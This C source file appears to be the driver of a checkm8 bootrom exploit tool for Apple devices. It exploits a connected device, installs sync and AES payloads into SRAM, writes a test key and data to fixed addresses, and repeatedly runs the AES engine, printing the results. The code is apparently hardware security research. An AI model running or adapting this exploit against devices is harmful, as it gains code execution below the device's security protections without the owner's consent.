#include "checkm8.h"

#include <stdio.h>
#include <string.h>
#include <unistd.h>

#include "command.h"
#include "payload.h"
#include "usb_helpers.h"

#ifdef CHECKM8_LOGGING

#include <stdarg.h>
#include <execinfo.h>

#endif

void checkm8_debug_indent(const char *format, ...)
{
#ifdef CHECKM8_LOGGING
    void *traces[100];
    int depth = backtrace(traces, 100) - 5;
    for(int i = 0; i < depth; i++)
    {
        printf("\t");
    }
    va_list args;

    va_start (args, format);
    vprintf(format, args);
    va_end(args);
#endif
}

void checkm8_debug_block(const char *format, ...)
{
#ifdef CHECKM8_LOGGING
    va_list args;

    va_start (args, format);
    vprintf(format, args);
    va_end(args);
#endif
}

int main()
{
    int ret;
    struct dev_cmd_resp *resp;
    struct pwned_device *dev = exploit_device();
    if(dev == NULL || dev->status == DEV_NORMAL)
    {
        printf("Failed to exploit device\n");
        return -1;
    }

    unsigned char key[8] = {0x01, 0x23, 0x45, 0x67, 0x89, 0xab, 0xcd, 0xef};
    unsigned char data[16] = {0xde, 0xad, 0xbe, 0xef, 0xde, 0xad, 0xbe, 0xef, 0xde, 0xad, 0xbe, 0xef, 0xde, 0xad, 0xbe,
                              0xef};

    if(IS_CHECKM8_FAIL(open_device_session(dev)))
    {
        printf("failed to open device session\n");
        return -1;
    }

    if(IS_CHECKM8_FAIL(install_payload(dev, PAYLOAD_SYNC, SRAM)))
    {
        printf("failed to install sync payload\n");
        return -1;
    }

    if(IS_CHECKM8_FAIL(install_payload(dev, PAYLOAD_AES_BUSY, SRAM)))
    {
        printf("failed to install aes busy payload\n");
        return -1;
    }

    resp = write_gadget(dev, 0x180152000, key, 8);
    if(IS_CHECKM8_FAIL(resp->ret))
    {
        printf("failed to write key to device\n");
        return -1;
    }

    resp = write_gadget(dev, 0x180153000, data, 16);
    if(IS_CHECKM8_FAIL(resp->ret))
    {
        printf("failed to write aes data\n");
        return -1;
    }

    free_dev_cmd_resp(resp);
    resp = execute_payload(dev, PAYLOAD_SYNC, 0, 0);
    if(IS_CHECKM8_FAIL(resp->ret))
    {
        printf("failed to execute sync payload\n");
        return -1;
    }

    free_dev_cmd_resp(resp);
    for(int i = 0; i < 100000; i++)
    {
        resp = execute_payload(dev, PAYLOAD_AES_BUSY, 16, 4, 0x180153000, 0x1800b0010, 0x180150000, 16);
        if(IS_CHECKM8_FAIL(resp->ret))
        {
            printf("failed to execute busy AES payload\n");
            return -1;
        }

        memcpy(data, resp->data, 16);
        free_dev_cmd_resp(resp);

        printf("got ");
        for(int j = 0; j < 16; j++)
        {
            printf("%02x", data[j]);
        }
        printf("\n");
        usleep(3000000);
    }

    close_device_session(dev);
    free_device(dev);
}
